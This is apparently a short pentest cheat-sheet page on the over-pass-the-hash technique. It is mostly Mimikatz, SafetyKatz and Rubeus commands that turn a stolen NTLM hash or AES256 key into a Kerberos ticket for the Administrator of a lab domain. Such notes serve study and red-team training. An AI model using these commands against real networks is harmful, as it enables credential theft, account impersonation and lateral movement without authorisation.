# Over Pass The Hash

Over pass the hash (OPTH) is used between domain joined and not passing directly the NTLM hash to authenticate, instead asking for TGT.

{% code overflow="wrap" fullWidth="false" %}
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys>  /run:cmd.exe" "exit"

Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt

Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}
